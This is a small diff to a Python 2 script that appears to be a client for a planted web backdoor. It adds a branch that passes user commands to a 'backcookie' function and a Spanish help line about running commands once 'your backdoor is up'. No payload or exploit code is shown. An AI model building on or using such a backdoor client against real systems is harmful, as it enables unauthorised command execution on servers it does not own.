@@ -84,5 +84,10 @@ def main():
             print "\t\t+            @mrjopino           +"
             print "\t\t----------------------------------\n\n"
 
+        if comando != "help": #ayuda
+            backcookie(comando, a)
+        else:
+            print "\033[92m[+]\033[94m Ejecuta comandos como loco, si ya tienes tu backdoor arriba! \n" + color.blanco
+
 if __name__ == "__main__":
     main()
